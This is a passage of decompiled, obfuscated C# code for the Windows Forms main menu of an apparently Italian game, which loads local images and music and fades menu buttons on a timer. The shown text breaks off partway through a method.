using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class GForm1 : Form
{
	private int int_0;

	private int int_1;

	private float float_0;

	private bool bool_0;

	private bool bool_1;

	private IContainer icontainer_0;

	private bool bool_2;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("FadeGame")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox3")]
	private PictureBox pictureBox_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox4")]
	private PictureBox pictureBox_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox5")]
	[CompilerGenerated]
	private PictureBox pictureBox_4;

	[AccessedThroughProperty("MemoryCleaner")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_1;

	internal virtual PictureBox PictureBox_0
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual Timer Timer_0
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_1;
			Timer val = default(Timer);
			while (true)
			{
				int num = -502179933;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xE43B722Cu) % 7u)
					{
					case 6u:
						GForm1.smethod_81(val, eventHandler_);
						num = ((int)num2 * -1671798300) ^ -2036485987;
						continue;
					case 5u:
					{
						int num4;
						int num5;
						if (val != null)
						{
							num4 = 522540695;
							num5 = 522540695;
						}
						else
						{
							num4 = 1933617840;
							num5 = 1933617840;
						}
						num = num4 ^ (int)(num2 * 1750572785);
						continue;
					}
					case 3u:
						val = timer_0;
						num = (int)((num2 * 2053766665) ^ 0x7A7E67D8);
						continue;
					case 1u:
						GForm1.smethod_80(val, eventHandler_);
						num = (int)(num2 * 987424666) ^ -1717638333;
						continue;
					case 0u:
					{
						timer_0 = value;
						val = timer_0;
						int num3;
						if (val != null)
						{
							num = -300239867;
							num3 = -300239867;
						}
						else
						{
							num = -32918247;
							num3 = -32918247;
						}
						continue;
					}
					default:
						return;
					case 4u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_009a: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a0: Expected O, but got Unknown
			EventHandler eventHandler_ = method_2;
			PictureBox val = default(PictureBox);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			EventHandler eventHandler_2 = default(EventHandler);
			while (true)
			{
				int num = 2096385549;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x756B5AD7u) % 11u)
					{
					case 10u:
					{
						int num5;
						int num6;
						if (val == null)
						{
							num5 = 1423424158;
							num6 = 1423424158;
						}
						else
						{
							num5 = 1905171449;
							num6 = 1905171449;
						}
						num = num5 ^ (int)(num2 * 1780653977);
						continue;
					}
					case 9u:
						val = pictureBox_1;
						num = (int)(num2 * 1259041481) ^ -71998391;
						continue;
					case 7u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = (int)((num2 * 1917310516) ^ 0x4F7B6C6C);
						continue;
					case 6u:
						pictureBox_1 = value;
						val = pictureBox_1;
						num = 863896782;
						continue;
					case 5u:
						eventHandler_2 = method_3;
						mouseEventHandler_ = new MouseEventHandler(method_4);
						num = ((int)num2 * -1004246188) ^ 0x41C01B4E;
						continue;
					case 3u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -1958416705) ^ 0x68630F0E;
						continue;
					case 2u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -1360024608;
							num4 = -1360024608;
						}
						else
						{
							num3 = -922971586;
							num4 = -922971586;
						}
						num = num3 ^ (int)(num2 * 1559607840);
						continue;
					}
					case 1u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -302660272) ^ 0x251DFEF0;
						continue;
					case 0u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = ((int)num2 * -961617639) ^ 0x2282D944;
						continue;
					default:
						return;
					case 8u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Expected O, but got Unknown
			EventHandler eventHandler_ = method_5;
			EventHandler eventHandler_2 = method_6;
			MouseEventHandler mouseEventHandler_ = new MouseEventHandler(method_7);
			PictureBox val = default(PictureBox);
			while (true)
			{
				int num = 1525498101;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x6AB19601u) % 10u)
					{
					case 9u:
					{
						int num5;
						int num6;
						if (val != null)
						{
							num5 = -102086712;
							num6 = -102086712;
						}
						else
						{
							num5 = -425386184;
							num6 = -425386184;
						}
						num = num5 ^ ((int)num2 * -530004231);
						continue;
					}
					case 8u:
						val = pictureBox_2;
						num = ((int)num2 * -1654003842) ^ 0x6EFE0E92;
						continue;
					case 7u:
						pictureBox_2 = value;
						val = pictureBox_2;
						num = 307239682;
						continue;
					case 5u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -105763976;
							num4 = -105763976;
						}
						else
						{
							num3 = -417424928;
							num4 = -417424928;
						}
						num = num3 ^ (int)(num2 * 1601303104);
						continue;
					}
					case 3u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -1115471899) ^ -1927689371;
						continue;
					case 2u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = (int)(num2 * 1723406555) ^ -1642110011;
						continue;
					case 1u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = (int)(num2 * 1589908829) ^ -848580532;
						continue;
					case 0u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -554870303) ^ 0x35D44428;
						continue;
					default:
						return;
					case 6u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ee: Expected O, but got Unknown
			EventHandler eventHandler_ = method_8;
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			while (true)
			{
				int num = 1860059447;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x6A0F532Cu) % 13u)
					{
					case 12u:
					{
						int num5;
						int num6;
						if (val == null)
						{
							num5 = -1321146166;
							num6 = -1321146166;
						}
						else
						{
							num5 = -1600137288;
							num6 = -1600137288;
						}
						num = num5 ^ (int)(num2 * 1216680423);
						continue;
					}
					case 11u:
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						num = (int)(num2 * 660344648) ^ -1265128212;
						continue;
					case 10u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -1585955299) ^ -1830236019;
						continue;
					case 9u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -1154129690;
							num4 = -1154129690;
						}
						else
						{
							num3 = -2105989256;
							num4 = -2105989256;
						}
						num = num3 ^ ((int)num2 * -798951523);
						continue;
					}
					case 8u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						num = (int)((num2 * 2041519392) ^ 0x1B66D1AE);
						continue;
					case 7u:
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -1493413464) ^ -101795402;
						continue;
					case 6u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -1346914342) ^ 0xAD8AAC4;
						continue;
					case 4u:
						mouseEventHandler_ = new MouseEventHandler(method_10);
						val = pictureBox_3;
						num = ((int)num2 * -167581505) ^ -108787351;
						continue;
					case 3u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = ((int)num2 * -866230245) ^ -558074620;
						continue;
					case 1u:
						eventHandler_2 = method_9;
						num = ((int)num2 * -1588099546) ^ 0x2899E6F0;
						continue;
					case 0u:
						pictureBox_3 = value;
						val = pictureBox_3;
						num = 1955626812;
						continue;
					default:
						return;
					case 2u:
						break;
					case 5u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c3: Expected O, but got Unknown
			EventHandler eventHandler_ = method_11;
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			while (true)
			{
				int num = 643028832;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x175FA5C1u) % 12u)
					{
					case 11u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -1722431556) ^ 0x2A63C287;
						continue;
					case 10u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = ((int)num2 * -1388467892) ^ 0x74D44F8E;
						continue;
					case 9u:
						eventHandler_2 = method_12;
						num = (int)(num2 * 1384072495) ^ -1600882758;
						continue;
					case 8u:
					{
						int num5;
						int num6;
						if (val == null)
						{
							num5 = -1257385098;
							num6 = -1257385098;
						}
						else
						{
							num5 = -1603779500;
							num6 = -1603779500;
						}
						num = num5 ^ (int)(num2 * 1435475186);
						continue;
					}
					case 5u:
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = (int)(num2 * 1420993192) ^ -1497024754;
						continue;
					case 4u:
						mouseEventHandler_ = new MouseEventHandler(method_13);
						val = pictureBox_4;
						num = (int)((num2 * 1139256340) ^ 0x595B5992);
						continue;
					case 3u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -1917519542;
							num4 = -1917519542;
						}
						else
						{
							num3 = -2120973250;
							num4 = -2120973250;
						}
						num = num3 ^ ((int)num2 * -607201693);
						continue;
					}
					case 2u:
						pictureBox_4 = value;
						num = 1522839257;
						continue;
					case 1u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						num = ((int)num2 * -1521939678) ^ -1759833106;
						continue;
					case 0u:
						val = pictureBox_4;
						num = (int)(num2 * 1937637875) ^ -633672623;
						continue;
					default:
						return;
					case 6u:
						break;
					case 7u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual Timer Timer_1
	{
		[CompilerGenerated]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_16;
			Timer val = timer_1;
			while (true)
			{
				int num = -558966396;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xD651A79Eu) % 8u)
					{
					case 6u:
						GForm1.smethod_80(val, eventHandler_);
						num = ((int)num2 * -947866886) ^ -14112959;
						continue;
					case 5u:
						GForm1.smethod_81(val, eventHandler_);
						num = (int)(num2 * 1356689511) ^ -379751059;
						continue;
					case 4u:
						val = timer_1;
						num = ((int)num2 * -1339136866) ^ -350874465;
						continue;
					case 3u:
						timer_1 = value;
						num = -1588979598;
						continue;
					case 2u:
					{
						int num5;
						int num6;
						if (val != null)
						{
							num5 = -2051535610;
							num6 = -2051535610;
						}
						else
						{
							num5 = -179411173;
							num6 = -179411173;
						}
						num = num5 ^ ((int)num2 * -715791097);
						continue;
					}
					case 1u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -1735140685;
							num4 = -1735140685;
						}
						else
						{
							num3 = -1606043322;
							num4 = -1606043322;
						}
						num = num3 ^ ((int)num2 * -299316587);
						continue;
					}
					default:
						return;
					case 7u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}
	}

	public GForm1()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		GForm1.smethod_8((Form)(object)this, (EventHandler)method_0);
		GForm1.smethod_9((Form)(object)this, new FormClosingEventHandler(method_15));
		int_0 = 0;
		int_1 = 0;
		float_0 = 0.3f;
		bool_0 = false;
		bool_1 = false;
		bool_2 = false;
		method_17();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.Class3_0.GForm1_0);
	}

	private void method_0(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -223867888;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8C2C0620u) % 53u)
				{
				case 52u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png"));
					num = ((int)num2 * -367398486) ^ -1909049490;
					continue;
				case 51u:
					num = (int)((num2 * 1639342279) ^ 0x507A1CF0);
					continue;
				case 50u:
					GForm1.smethod_20((object)int_1);
					num = (int)((num2 * 557596606) ^ 0x1F97CD43);
					continue;
				case 49u:
					GForm1.smethod_16((Control)(object)PictureBox_4, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")), 0.1f));
					num = ((int)num2 * -1505739409) ^ 0x7A7827E4;
					continue;
				case 48u:
					num = (int)(num2 * 1933470826) ^ -1203687699;
					continue;
				case 47u:
				{
					int num5;
					int num6;
					if (GClass1.bool_1)
					{
						num5 = 1003588063;
						num6 = 1003588063;
					}
					else
					{
						num5 = 1746926827;
						num6 = 1746926827;
					}
					num = num5 ^ (int)(num2 * 109574314);
					continue;
				}
				case 46u:
					GClass3.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\main_menu_theme.mp3"));
					num = (int)((num2 * 2103915968) ^ 0x5C37A408);
					continue;
				case 45u:
					GForm1.smethod_12(GForm1.smethod_11(), ProcessPriorityClass.RealTime);
					GClass3.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data"));
					num = (int)(num2 * 665295576) ^ -2011003404;
					continue;
				case 44u:
					GForm1.smethod_18(Timer_1);
					num = ((int)num2 * -86959220) ^ 0x462DCA82;
					continue;
				case 43u:
					num = (int)(num2 * 2075951394) ^ -549266819;
					continue;
				case 41u:
					GForm1.smethod_16((Control)(object)PictureBox_1, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")), 0.1f));
					num = (int)(num2 * 856443413) ^ -1617748995;
					continue;
				case 40u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_la_cpu.png"));
					num = ((int)num2 * -2056261473) ^ 0x1EB938F8;
					continue;
				case 39u:
					num = (int)((num2 * 545770254) ^ 0x761C8713);
					continue;
				case 38u:
					GForm1.smethod_19();
					num = (int)(num2 * 1743065459) ^ -1562196826;
					continue;
				case 37u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\fai_un_duello.png"));
					num = (int)((num2 * 1829690418) ^ 0x4367BC2A);
					continue;
				case 36u:
					GForm1.smethod_20((object)int_0);
					num = (int)((num2 * 657862331) ^ 0x498268CC);
					continue;
				case 35u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
					num = (int)(num2 * 905972214) ^ -116620123;
					continue;
				case 34u:
					GForm1.smethod_20((object)float_0);
					bool_0 = true;
					num = ((int)num2 * -1669680562) ^ -922582406;
					continue;
				case 33u:
					GClass1.bool_1 = true;
					num = (int)((num2 * 103883944) ^ 0x6095648B);
					continue;
				case 32u:
					num = ((int)num2 * -1652622654) ^ 0x57065006;
					continue;
				case 31u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\horror_music.mp3"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\schermata_omegle.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\marco_introduzione.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\introduction_start_music.mp3"));
					GForm1.smethod_16((Control)(object)this, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg")));
					num = ((int)num2 * -215304082) ^ -1702873942;
					continue;
				case 30u:
					num = (int)((num2 * 818251320) ^ 0x303985AA);
					continue;
				case 29u:
					num = (int)((num2 * 218304405) ^ 0x6BD1E298);
					continue;
				case 28u:
					GForm1.smethod_16((Control)(object)PictureBox_0, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png")));
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
					num = ((int)num2 * -1396282828) ^ -71599886;
					continue;
				case 27u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg"));
					num = (int)(num2 * 596231192) ^ -327161040;
					continue;
				case 25u:
					bool_1 = false;
					num = (int)((num2 * 1022462393) ^ 0x3BB0E7B4);
					continue;
				case 24u:
					GClass1.smethod_1().method_0();
					num = ((int)num2 * -1815878193) ^ -1284131327;
					continue;
				case 23u:
					GClass1.smethod_0();
					num = (int)(num2 * 1094026416) ^ -471386438;
					continue;
				case 22u:
					GForm1.smethod_16((Control)(object)PictureBox_3, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")), 0.1f));
					num = ((int)num2 * -1356236833) ^ 0x68B13BE4;
					continue;
				case 21u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_hover.png"));
					num = (int)(num2 * 1153218732) ^ -514273116;
					continue;
				case 20u:
					GForm1.smethod_18(Timer_0);
					num = ((int)num2 * -629548052) ^ 0x324F827F;
					continue;
				case 19u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png"));
					num = (int)((num2 * 1332323078) ^ 0x67625344);
					continue;
				case 18u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_hover.png"));
					num = ((int)num2 * -1531163536) ^ 0x317883AC;
					continue;
				case 17u:
				{
					int num7;
					int num8;
					if (GClass1.bool_1)
					{
						num7 = -1117562419;
						num8 = -1117562419;
					}
					else
					{
						num7 = -1891256454;
						num8 = -1891256454;
					}
					num = num7 ^ ((int)num2 * -393284348);
					continue;
				}
				case 16u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_pressed.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_pressed.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_pressed.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_pressed.png"));
					num = ((int)num2 * -782118612) ^ -437037815;
					continue;
				case 15u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
					num = ((int)num2 * -31919794) ^ -925110322;
					continue;
				case 14u:
					GForm1.smethod_16((Control)(object)PictureBox_0, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_0), 0.1f));
					num = (int)(num2 * 2372450) ^ -213484456;
					continue;
				case 13u:
					GForm1.smethod_16((Control)(object)PictureBox_2, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")), 0.1f));
					num = (int)((num2 * 983322412) ^ 0x44822B8);
					continue;
				case 12u:
					num = ((int)num2 * -2098520601) ^ -345345940;
					continue;
				case 11u:
					num = -1093203600;
					continue;
				case 10u:
					num = (int)(num2 * 591919678) ^ -1657849406;
					continue;
				case 9u:
					num = (int)(num2 * 570090858) ^ -2075981333;
					continue;
				case 8u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\dark_story.jpg"));
					num = (int)(num2 * 803546368) ^ -747259581;
					continue;
				case 7u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_hover.png"));
					num = (int)((num2 * 1158542053) ^ 0x28E01704);
					continue;
				case 6u:
					GForm1.smethod_19();
					num = (int)(num2 * 1736515281) ^ -1926124796;
					continue;
				case 5u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_hover.png"));
					num = ((int)num2 * -13744190) ^ 0x3412763;
					continue;
				case 4u:
					flag = !GClass1.bool_1;
					num = -1951058259;
					continue;
				case 3u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 245734177;
						num4 = 245734177;
					}
					else
					{
						num3 = 567054888;
						num4 = 567054888;
					}
					num = num3 ^ ((int)num2 * -1281280537);
					continue;
				}
				case 2u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_gli_altri.png"));
					num = ((int)num2 * -1871087861) ^ -887769012;
					continue;
				case 1u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_la_cpu_hover.png"));
					num = (int)(num2 * 133090136) ^ -1184638948;
					continue;
				case 0u:
					num = ((int)num2 * -1295635469) ^ -211936094;
					continue;
				default:
					return;
				case 26u:
					break;
				case 42u:
					return;
				}
				break;
			}
		}
	}

	public static Bitmap smethod_0(Image image_0, float float_1)
	{
		Bitmap val = GForm1.smethod_23(GForm1.smethod_21(image_0), GForm1.smethod_22(image_0));
		ColorMatrix colorMatrix_ = default(ColorMatrix);
		Graphics graphics_ = default(Graphics);
		ImageAttributes imageAttributes_ = default(ImageAttributes);
		Bitmap result = default(Bitmap);
		while (true)
		{
			int num = -932094502;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB2DD5372u) % 12u)
				{
				case 11u:
					num = (int)(num2 * 1707325959) ^ -356570623;
					continue;
				case 10u:
					GForm1.smethod_26(colorMatrix_, float_1);
					num = ((int)num2 * -1803268236) ^ 0x3A58F0EE;
					continue;
				case 8u:
					graphics_ = GForm1.smethod_24((Image)(object)val);
					num = (int)((num2 * 1481681895) ^ 0x7C3A9795);
					continue;
				case 7u:
					imageAttributes_ = GForm1.smethod_27();
					num = (int)(num2 * 1853742224) ^ -962976345;
					continue;
				case 6u:
					GForm1.smethod_30(graphics_);
					num = (int)((num2 * 792267127) ^ 0x71DEEF61);
					continue;
				case 5u:
					num = (int)((num2 * 1134407811) ^ 0x74B28F83);
					continue;
				case 3u:
					colorMatrix_ = GForm1.smethod_25();
					num = ((int)num2 * -1033985655) ^ -619344537;
					continue;
				case 2u:
					result = val;
					num = ((int)num2 * -1867016450) ^ -1424520602;
					continue;
				case 1u:
					GForm1.smethod_28(imageAttributes_, colorMatrix_, (ColorMatrixFlag)0, (ColorAdjustType)1);
					GForm1.smethod_29(graphics_, image_0, new Rectangle(0, 0, GForm1.smethod_21((Image)(object)val), GForm1.smethod_22((Image)(object)val)), 0, 0, GForm1.smethod_21(image_0), GForm1.smethod_22(image_0), (GraphicsUnit)2, imageAttributes_);
					num = ((int)num2 * -1705934037) ^ -2071888954;
					continue;
				case 0u:
					num = ((int)num2 * -1128164652) ^ 0x3A9D9EF5;
					continue;
				case 9u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		if (((int_0 <= 15) & (int_1 == 0)) | ((int_0 <= 9) & (int_1 != 0)))
		{
			goto IL_0356;
		}
		goto IL_0809;
		IL_0809:
		int num = 1783974322;
		goto IL_0712;
		IL_0712:
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x2168D30Du) % 57u)
			{
			case 56u:
				num = (int)(num2 * 911970022) ^ -622061901;
				continue;
			case 55u:
			{
				ref float reference4 = ref float_0;
				reference4 = (float)((double)reference4 + 0.3);
				num = (int)((num2 * 325035908) ^ 0x4E125729);
				continue;
			}
			case 54u:
				break;
			case 53u:
				GForm1.smethod_20((object)float_0);
				num = ((int)num2 * -1811592614) ^ 0x1295CF51;
				continue;
			case 52u:
				num = (int)((num2 * 2146428952) ^ 0x21E573FB);
				continue;
			case 51u:
			{
				int num9;
				int num10;
				if (flag2)
				{
					num9 = 623923907;
					num10 = 623923907;
				}
				else
				{
					num9 = 1988364763;
					num10 = 1988364763;
				}
				num = num9 ^ (int)(num2 * 1048465618);
				continue;
			}
			case 49u:
				num = (int)((num2 * 2109231964) ^ 0x3E1A57B8);
				continue;
			case 48u:
				checked
				{
					int_1++;
					int_0 = 0;
				}
				num = ((int)num2 * -591919233) ^ 0x7B25F2A3;
				continue;
			case 47u:
				GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
				num = (int)((num2 * 1255513069) ^ 0x71324166);
				continue;
			case 46u:
				GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
				num = ((int)num2 * -1248868451) ^ -42941902;
				continue;
			case 45u:
				num = ((int)num2 * -346942234) ^ -1382771496;
				continue;
			case 44u:
				GForm1.smethod_16((Control)(object)PictureBox_0, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_0), float_0));
				num = (int)((num2 * 332194705) ^ 0xB801549);
				continue;
			case 43u:
				flag2 = int_1 == 4;
				num = 577356309;
				continue;
			case 42u:
				GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
				num = ((int)num2 * -529739118) ^ -1316466748;
				continue;
			case 41u:
				num = 1436263130;
				continue;
			case 40u:
				goto IL_0234;
			case 39u:
				num = 347171657;
				continue;
			case 38u:
				GForm1.smethod_16((Control)(object)PictureBox_0, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png")));
				num = (int)(num2 * 1199315206) ^ -1884117420;
				continue;
			case 37u:
				GForm1.smethod_16((Control)(object)PictureBox_2, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_2), float_0));
				num = ((int)num2 * -447890606) ^ -489295080;
				continue;
			case 36u:
				num = ((int)num2 * -2040126909) ^ 0x3307EB00;
				continue;
			case 35u:
			{
				ref float reference5 = ref float_0;
				reference5 = (float)((double)reference5 + 0.3);
				num = (int)((num2 * 1040534886) ^ 0x2705039F);
				continue;
			}
			case 34u:
				GForm1.smethod_20((object)Timer_0);
				num = (int)(num2 * 1246595362) ^ -2012175372;
				continue;
			case 33u:
				num = 185603244;
				continue;
			case 32u:
				num = (int)(num2 * 1826330692) ^ -596109525;
				continue;
			case 31u:
				num = ((int)num2 * -1790690402) ^ -1937407478;
				continue;
			case 30u:
				goto end_IL_0712;
			case 29u:
				num = ((int)num2 * -1615922735) ^ -1120291648;
				continue;
			case 28u:
				num = ((int)num2 * -681990282) ^ -253438537;
				continue;
			case 27u:
			{
				int num11;
				int num12;
				if (flag)
				{
					num11 = 301589139;
					num12 = 301589139;
				}
				else
				{
					num11 = 1868771911;
					num12 = 1868771911;
				}
